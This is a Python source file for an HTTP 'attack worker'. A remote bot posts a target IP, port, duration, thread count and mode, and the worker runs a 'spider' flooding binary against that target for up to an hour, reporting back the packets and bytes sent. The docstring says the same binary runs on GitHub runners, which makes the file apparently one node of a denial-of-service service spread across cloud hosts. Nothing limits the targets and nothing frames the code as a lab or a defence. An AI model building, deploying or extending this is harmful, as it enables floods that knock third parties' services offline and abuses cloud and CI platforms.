"""
Railway-side attack worker.

One container, one HTTP API. The VPS bot posts a job, this box runs the same
`spider` binary the GitHub runners use, reports the counters, and stops when the
duration is up or when `/stop` arrives.

    POST /attack   {"ip": "...", "port": 443, "seconds": 60, "threads": 512}
    GET  /status
    POST /stop
    GET  /health

Auth: every /attack and /stop must carry `X-Auth: <WORKER_SECRET>`.

Only one job runs at a time: a second container is a second worker, and stacking
jobs on one box just divides the same CPU between them.
"""

from __future__ import annotations

import json
import os
import shutil
import signal
import subprocess
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

WORKER_SECRET = os.getenv("WORKER_SECRET", "").strip()
BINARY = os.getenv("SPIDER_BINARY", "/opt/spider/spider")
MAX_SECONDS = int(os.getenv("MAX_SECONDS", "3600"))
MAX_THREADS = int(os.getenv("MAX_THREADS", "2048"))
DEFAULT_THREADS = int(os.getenv("THREADS", "512"))
DEFAULT_MODE = os.getenv("SPIDER_MODE", "vc")
PORT = int(os.getenv("PORT", "8080"))

LOCK = threading.Lock()
JOB = {
    "running": False,
    "ip": None,
    "port": None,
    "started": 0.0,
    "ends": 0.0,
    "threads": 0,
    "mode": None,
    "packets": 0,
    "bytes": 0,
    "connections": 0,
    "last_line": "",
    "error": None,
}
PROC: subprocess.Popen | None = None


def _validate(payload: dict) -> tuple[str, int, int, int, str]:
    ip = str(payload.get("ip", "")).strip()
    if not ip or len(ip) > 64:
        raise ValueError("ip is required")

    port = int(payload.get("port", 0))
    if not 1 <= port <= 65535:
        raise ValueError("port must be 1-65535")

    seconds = int(payload.get("seconds", 0))
    if not 1 <= seconds <= MAX_SECONDS:
        raise ValueError(f"seconds must be 1-{MAX_SECONDS}")

    threads = int(payload.get("threads", DEFAULT_THREADS))
    if not 1 <= threads <= MAX_THREADS:
        raise ValueError(f"threads must be 1-{MAX_THREADS}")

    mode = str(payload.get("mode", DEFAULT_MODE)).lower()
    if mode not in ("udp", "tcp", "raw", "vc"):
        raise ValueError("mode must be udp, tcp, raw or vc")

    return ip, port, seconds, threads, mode


def _reader(proc: subprocess.Popen) -> None:
    """Keep the counters from the last stat line the engine prints."""
    assert proc.stdout is not None
    for raw in proc.stdout:
        line = raw.decode(errors="replace").strip()
        if not line:
            continue
        JOB["last_line"] = line
        if line.startswith("spider: done"):
            # spider: done — 1539781 packets, 1127.6 MiB, 0 connections in 5s
            try:
                parts = line.split("—", 1)[1].split(",")
                JOB["packets"] = int(parts[0].strip().split()[0])
                JOB["bytes"] = int(float(parts[1].strip().split()[0]) * 1024 * 1024)
                JOB["connections"] = int(parts[2].strip().split()[0])
            except Exception:
                pass


def _run_job(ip: str, port: int, seconds: int, threads: int, mode: str) -> None:
    global PROC
    started = time.time()
    JOB.update({
        "running": True, "ip": ip, "port": port, "started": started,
        "ends": started + seconds, "threads": threads, "mode": mode,
        "packets": 0, "bytes": 0, "connections": 0,
        "last_line": "", "error": None,
    })

    cmd = ["sudo", "-n", BINARY, ip, str(port), str(seconds), str(threads), mode]
    if os.geteuid() == 0:
        cmd = [BINARY, ip, str(port), str(seconds), str(threads), mode]

    try:
        PROC = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            preexec_fn=os.setsid,
        )
    except Exception as exc:  # noqa: BLE001
        JOB.update({"running": False, "error": f"{type(exc).__name__}: {exc}"})
        return

    threading.Thread(target=_reader, args=(PROC,), daemon=True).start()
    try:
        PROC.wait(timeout=seconds + 30)
    except subprocess.TimeoutExpired:
        _kill()
    finally:
        JOB["running"] = False
        PROC = None


def _kill() -> None:
    global PROC
    if PROC is None:
        return
    try:
        os.killpg(os.getpgid(PROC.pid), signal.SIGTERM)
    except Exception:
        pass
    time.sleep(1)
    try:
        os.killpg(os.getpgid(PROC.pid), signal.SIGKILL)
    except Exception:
        pass


class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, *args):  # noqa: D401 - silence per-request noise
        return

    def _send(self, status: int, payload: dict) -> None:
        body = json.dumps(payload).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _authed(self) -> bool:
        if not WORKER_SECRET:
            return True
        return self.headers.get("X-Auth", "") == WORKER_SECRET

    def do_GET(self):
        if self.path == "/health":
            self._send(200, {"ok": True, "binary": os.path.exists(BINARY)})
            return
        if self.path == "/status":
            self._send(200, {
                "running": JOB["running"],
                "ip": JOB["ip"], "port": JOB["port"], "mode": JOB["mode"],
                "threads": JOB["threads"],
                "elapsed": int(time.time() - JOB["started"]) if JOB["started"] else 0,
                "remaining": max(0, int(JOB["ends"] - time.time())) if JOB["running"] else 0,
                "packets": JOB["packets"], "bytes": JOB["bytes"],
                "connections": JOB["connections"],
                "last_line": JOB["last_line"], "error": JOB["error"],
            })
            return
        self._send(404, {"ok": False, "error": "not found"})

    def do_POST(self):
        length = int(self.headers.get("Content-Length") or 0)
        raw = self.rfile.read(length) if length else b""

        if self.path == "/stop":
            if not self._authed():
                self._send(401, {"ok": False, "error": "bad auth"})
                return
            with LOCK:
                _kill()
                JOB["running"] = False
            self._send(200, {"ok": True, "stopped": True})
            return

        if self.path != "/attack":
            self._send(404, {"ok": False, "error": "not found"})
            return

        if not self._authed():
            self._send(401, {"ok": False, "error": "bad auth"})
            return

        with LOCK:
            if JOB["running"]:
                self._send(409, {"ok": False, "error": "job already running"})
                return
            try:
                payload = json.loads(raw or b"{}")
                ip, port, seconds, threads, mode = _validate(payload)
            except (ValueError, TypeError, json.JSONDecodeError) as exc:
                self._send(400, {"ok": False, "error": str(exc)})
                return
            threading.Thread(
                target=_run_job, args=(ip, port, seconds, threads, mode), daemon=True
            ).start()

        self._send(202, {"ok": True, "started": True, "seconds": seconds})


if __name__ == "__main__":
    if not shutil.which(BINARY) and not os.path.exists(BINARY):
        print(f"worker: binary missing at {BINARY}", flush=True)
    print(f"worker: listening on :{PORT}  binary={BINARY}", flush=True)
    ThreadingHTTPServer(("0.0.0.0", PORT), Handler).serve_forever()
